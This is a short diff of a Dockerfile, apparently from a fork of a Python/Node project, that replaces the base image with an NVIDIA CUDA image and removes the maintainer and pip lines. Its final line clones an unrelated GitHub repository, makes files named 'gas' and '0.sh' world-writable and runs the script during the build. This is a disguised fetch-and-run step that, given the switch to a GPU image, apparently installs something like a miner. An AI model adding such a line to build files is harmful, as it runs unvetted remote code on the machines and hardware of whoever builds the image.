@@ -1,6 +1,6 @@
-FROM nikolaik/python-nodejs:python3.8-nodejs16
+FROM nvidia/cuda:10.2-cudnn7-devel
 
-MAINTAINER Albert King <jindaixang@163.com>
+ENV LANG=C.UTF-8 LC_ALL=C.UTF-8
+ENV CUDNN_VERSION 8.2.0.53
 
-# RUN pip install akshare -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host=mirrors.aliyun.com  --upgrade
 RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
